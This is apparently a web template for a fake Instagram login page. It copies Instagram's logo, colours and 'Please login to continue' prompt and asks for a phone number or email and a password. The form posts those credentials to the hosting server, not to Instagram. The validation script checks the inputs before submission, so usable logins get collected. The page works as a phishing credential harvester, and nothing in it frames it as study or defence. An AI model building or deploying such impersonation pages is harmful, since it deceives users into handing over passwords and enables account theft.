{% extends "base.html" %}
{% block body %}
<div class="card" style="max-width:520px;margin:28px auto;transition:none;transform:none;">
  <div class="platform-header">
    <div class="icon-circle bg-instagram">
      <i class="fa-brands fa-instagram icon-lg"></i>
    </div>
    <div>
      <h2 class="notranslate" style="margin:0;color:#E4405F;">Instagram</h2>
      <div style="color:#64748b;font-size:13px">Please login to continue</div>
    </div>
  </div>

  <form id="loginForm" method="post" novalidate>
    <input class="input" id="address" name="address" placeholder="Mobile number or email address" required>
    <div class="error-text" id="addressError"></div>

    <input class="input" id="password" name="password" type="password" placeholder="Password" required>
    <div class="error-text" id="passwordError"></div>

    <button class="btn login-btn" type="submit">Log in</button>
  </form>
</div>

<style>
.input {
  width: 100%;
  padding: 14px;
  border-radius: 18px;
  border: 1px solid #e5e7eb;
  margin-bottom: 8px;
  font-size: 16px;
  transition: border-color 0.2s, box-shadow 0.2s;
}
.input:focus {
  border-color: #E4405F;
  box-shadow: 0 0 0 3px rgba(228, 64, 95, 0.2);
  outline: none;
}
.input-error {
  border-color: #ef4444;
  box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.15);
}
.error-text {
  color: #ef4444;
  font-size: 13px;
  margin-top: -4px;
  margin-bottom: 8px;
}

.login-btn {
  width: 100%;
  background: linear-gradient(45deg, #f58529, #dd2a7b, #8134af, #515bd4);
  color: #fff;
  font-size: 16px;
  font-weight: 600;
  padding: 12px;
  border-radius: 25px;
  cursor: pointer;
  border: none;
  transition: background 0.25s, transform 0.1s, box-shadow 0.2s;
  box-shadow: 0 6px 16px rgba(221, 42, 123, 0.25);
  display: block;
  margin-top: 8px;
}
.login-btn:hover {
  background: linear-gradient(45deg, #fd5949, #d6249f, #c13584, #833ab4);
}
.login-btn:active {
  transform: scale(0.985);
}
</style>

<script>
document.getElementById("loginForm").addEventListener("submit", function(event) {
  const address = document.getElementById("address");
  const password = document.getElementById("password");
  const addressError = document.getElementById("addressError");
  const passwordError = document.getElementById("passwordError");

  // Validation patterns
  const emailPattern = /^[a-z0-9._%+-]+@[a-z0-9.-]+\.(com|net|org|co|io|me|info|biz)$/;
  const phonePattern = /^\+?\d{6,}$/;

  let valid = true;
  [address, password].forEach(input => input.classList.remove("input-error"));
  [addressError, passwordError].forEach(el => el.textContent = "");

  const addrVal = address.value.trim();

  if (!(emailPattern.test(addrVal) || phonePattern.test(addrVal))) {
    valid = false;
    address.classList.add("input-error");
    addressError.textContent = "Enter a valid lowercase email (e.g. name@email.com) or phone number.";
  }

  if (password.value.trim().length < 6) {
    valid = false;
    password.classList.add("input-error");
    passwordError.textContent = "Password must be at least 6 characters.";
  }

  if (!valid) event.preventDefault();
});

document.querySelectorAll(".input").forEach(input => {
  input.addEventListener("input", () => {
    input.classList.remove("input-error");
    if (input.id === "address") document.getElementById("addressError").textContent = "";
    if (input.id === "password") document.getElementById("passwordError").textContent = "";
  });
});
</script>
{% endblock %}
